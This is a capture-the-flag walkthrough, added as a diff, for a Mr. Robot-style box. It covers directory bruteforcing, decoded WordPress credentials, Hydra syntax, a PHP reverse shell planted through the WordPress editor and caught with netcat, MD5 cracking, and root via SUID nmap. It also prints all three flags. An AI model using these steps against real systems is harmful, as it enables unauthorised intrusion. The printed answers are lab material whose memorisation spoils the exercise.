@@ -1,0 +1,77 @@
+1. Directory bruteforcing ( Gobuster )
+	<< key 1st >>
+	>> directories.txt -->  ../robots.txt --> ../key-1-of-3.txt --> key"073403c8a58a1f80d943455fb30724b9"
+
+2. Cryptography ( CyberChef )
+	>> ../license --> scroll it down to get the key :)
+	>> go to cyberchef and paste "ZWxsaW90OkVSMjgtMDY1Mgo=" to get "elliot:ER28-0652"
+
+3. Password bruteforcing ( Hydra )
+	>> but I didn't use this :)
+	>> hydra -l <username> -P <password-list> <target-IP> -t <threads> <protocol>
+
+	    -l <username> → Specify a single username.
+
+	    -L <username-list> → Use a list of usernames.
+
+	    -p <password> → Try a single password.
+
+	    -P <password-list> → Use a wordlist of passwords.
+
+	    <target-IP> → IP or domain of the target.
+
+	    -t <threads> → Number of threads (default is 16).
+	    
+	    <protocol> → Service to attack (e.g., ssh, ftp, http, etc.).
+
+4. Login Wordpress ( Gobuster )
+	>> ../wp-login.php --> "username:password" --> "elliot:ER28-0652"
+
+5. Reverse Shell ( PHP rev shell )
+	<< key 2nd >>
+	
+	>> Go to "www.revshells.com" --> PHP PentestMonkey 
+	>> In the code change the ip to tun0 ip ( 10.10.10.10 --> 10.X.X.X ) 
+	>> In the wordpress go to editor and then php add this rev sehll code in that and update it . 
+	>> Open the ../xyz.php 
+	>> Then run netcat --> nc -lvnp "port number"
+	>> run this command to run the terminal --> " python3 -c 'import pty; pty.spawn("/bin/bash")' " 
+	>> cd home --> cd robot --> cat password.raw-md5 --> "c3fcd3d76192e4007dfb496cca67e13b"
+	>> as it is "md5" hashed , so we need to decrypt it 
+	>> "c3fcd3d76192e4007dfb496cca67e13b" --> "abcdefghijklmnopqrstuvwxyz"
+	>> su "username" --> su robot --> password : "abcdefghijklmnopqrstuvwxyz"
+	>> cat key-2-of-3.txt --> "822c73956184f694993bede3eb39f959"
+
+6. Privilege Escalation ( GTFOBins - nmap shell )
+
+	What is privilege escalation?
+	Privilege escalation refers to the process in which a user gains higher levels of access or privileges within a computer system,network, or application. To be more specific, it's the exploitation of a vulnerability, design flaw, or configuration 
+	oversight in an operating system or application.
+	
+	<< key 3rd >>
+
+	>> permission denied at "ls /root"  
+	>> find / -perm +6000 2>/dev/null | grep '/bin/'
+	     >> Breaking it Down:
+
+		   1. find / -perm +6000 2>/dev/null
+
+			find / → Searches from the root directory (/).
+
+			-perm +6000 → Looks for files with SUID (4000) or SGID (2000) permissions.
+
+			2>/dev/null → Redirects error messages (like "Permission denied") to /dev/null, hiding them.
+
+		   2. | grep '/bin/'
+
+			| → Pipes the output of find into grep.
+
+			grep '/bin/' → Filters results to only show files inside /bin/ (or subdirectories).
+	
+	>> .... /usr/local/bin/nmap
+	>> Go to "gtfobins.github.io" --> look for nmap shell and use this --> run "nmap --interactive" then "!sh"
+	>> to check root privilege tun command "whoami"
+	>> cd /root --> ls --> cat key-3-of-3.txt --> "04787ddef27c3dee1ee161b21670b4e4"
+	
+	
+	
